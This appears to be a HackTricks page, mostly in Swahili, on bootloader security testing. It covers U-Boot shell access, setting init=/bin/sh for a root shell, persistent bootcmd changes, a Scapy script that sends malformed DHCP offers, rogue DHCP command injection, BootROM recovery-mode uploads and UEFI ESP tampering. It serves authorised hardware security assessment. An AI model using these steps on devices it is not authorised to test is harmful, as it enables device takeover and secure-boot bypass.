# Upimaji wa Bootloader

{{#include ../../banners/hacktricks-training.md}}

Hatua zifuatazo zinapendekezwa kwa kubadilisha usanidi wa kuanzisha kifaa na kujaribu bootloaders kama U-Boot na loaders za daraja la UEFI. Lenga kupata utekelezaji wa msimbo mapema, kutathmini ulinzi wa signature/rollback, na kutumia njia za recovery au network-boot.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Fikia interpreter shell
- Wakati wa boot, bonyeza kitufe kinachojulikana cha kuvunja (mara nyingi kitufe chochote, 0, space, au mfululizo wa "magic" maalum kwa board) kabla `bootcmd` haijaendeshwa ili kusema kwenye prompt ya U-Boot.

2. Chunguza hali ya boot na vigezo
- Amri muhimu:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Badilisha boot arguments ili kupata root shell
- Ongeza `init=/bin/sh` ili kernel iwekee shell badala ya init ya kawaida:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot kutoka kwenye TFTP server yako
- Sanidi mtandao na chukua kernel/fit image kutoka LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Fanya mabadiliko yaendelee kupitia environment
- Ikiwa env storage haijalindwa kwa kuandika, unaweza kuhifadhi udhibiti:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Angalia vigezo kama `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` vinavyoathiri njia za fallback. Thamani zisizosanifiwa vizuri zinaweza kutoa fursa za kuvunja repeated kuingia shell.

6. Angalia vipengele vya debug/visivyo salama
- Tafuta: `bootdelay` > 0, `autoboot` imezimwa, `usb start; fatload usb 0:1 ...` isiyozuiliwa, uwezo wa `loady`/`loads` kupitia serial, `env import` kutoka media zisizotegemewa, na kernels/ramdisks zinazopakiwa bila ukaguzi wa signature.

7. U-Boot image/verification testing
- Ikiwa platform inadai secure/verified boot kwa FIT images, jaribu picha zisizotiwa sahihi na zilizoendeshwa:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Kutokuwepo kwa `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` au tabia ya zamani `verify=n` mara nyingi huruhusu kuanzisha payload yoyote.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- U-Boot’s legacy BOOTP/DHCP handling imekuwa na masuala ya memory-safety. Kwa mfano, CVE‑2024‑42040 inaelezea ufunuliwa wa memory kupitia majibu ya DHCP yaliyoundwa ambayo yanaweza leak bytes kutoka kumbukumbu ya U-Boot kurudi kwenye waya. Fanya majaribio ya njia za DHCP/PXE na thamani ndefu/edge-case (option 67 bootfile-name, vendor options, file/servername fields) na angalia kwa hangs/leaks.
- Minimal Scapy snippet to stress boot parameters during netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Pia thibitisha kama uwanja za PXE filename zinapitishwa kwa mantiki ya shell/loader bila kusafishwa wakati zinachanganywa na scripts za provisioning za upande wa OS.

9. Rogue DHCP server command injection testing
- Sanidi huduma ya rogue DHCP/PXE na jaribu kuingiza tabia ndani ya filename au uwanja wa options ili kufikia interpreters za amri katika hatua za baadaye za mnyororo wa boot. Metasploit’s DHCP auxiliary, `dnsmasq`, au Scapy scripts za custom zinafanya kazi vyema. Hakikisha umeweka mtandao wa maabara kando kwanza.

## SoC ROM recovery modes that override normal boot

SoCs nyingi zinaonyesha BootROM "loader" mode ambayo itakubali msimbo kupitia USB/UART hata ukiwa picha za flash ni batili. Ikiwa secure-boot fuses hazijawashwa, hii inaweza kutoa utekelezaji wa msimbo yoyote mapema katika mnyororo.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Tathmini kama kifaa kina secure-boot eFuses/OTP zilizochomwa. Ikiwa hapana, BootROM download modes mara nyingi bypass uthibitisho wa ngazi ya juu (U-Boot, kernel, rootfs) kwa kutekeleza first-stage payload yako moja kwa moja kutoka SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Mount EFI System Partition (ESP) na angalia vipengele vya loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Jaribu kuanza na components za boot zilizopunguzwa au zilizojulikana kuwa na vunerabilities ikiwa Secure Boot revocations (dbx) haziko za sasa. Ikiwa platform bado inamtumaini shim/bootmanager za zamani, mara nyingi unaweza kupakia kernel yako mwenyewe au `grub.cfg` kutoka ESP kupata persistence.

11. Boot logo parsing bugs (LogoFAIL class)
- Firmware za OEM/IBV zilikuwa zilizoathirika na dosari za parsing ya picha kwenye DXE zinazoshughulikia boot logos. Ikiwa mwizi anaweza kuweka picha iliyotengenezwa kwenye ESP chini ya njia maalum ya vendor (mfano, `\EFI\<vendor>\logo\*.bmp`) na kuanzisha upya, utekelezaji wa msimbo wakati wa boot mapema unaweza kuwa uwezekano hata ikiwa Secure Boot imewezeshwa. Jaribu kama platform inakubali logo zinazotolewa na mtumiaji na kama njia hizo zinaweza kuandikwa kutoka kwa OS.

## Hardware caution

Kuwa mwangalifu unaposhughulika na SPI/NAND flash wakati wa boot mapema (mfano, kupeleka pins ili kupitisha reads) na kila mara rejea datasheet ya flash. Shorts zilizotimia vibaya zinaweza kuharibu kifaa au programmer.

## Notes and additional tips

- Jaribu `env export -t ${loadaddr}` na `env import -t ${loadaddr}` kuhamisha blobs za environment kati ya RAM na storage; baadhi ya platforms huruhusu kuingiza env kutoka kwenye media zinazoweza kuondolewa bila uthibitisho.
- Kwa persistence kwenye systems za Linux zinazoongeza kupitia `extlinux.conf`, kubadilisha mstari wa `APPEND` (kuongeza `init=/bin/sh` au `rd.break`) kwenye partition ya boot mara nyingi inatosha wakati hakukuwa na ukaguzi wa signature.
- Ikiwa userland inatoa `fw_printenv/fw_setenv`, thibitisha kwamba `/etc/fw_env.config` inalingana na env storage halisi. Offsets zilizosanifiwa vibaya zinakuwezesha kusoma/kuandika eneo lisilo sahihi la MTD.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
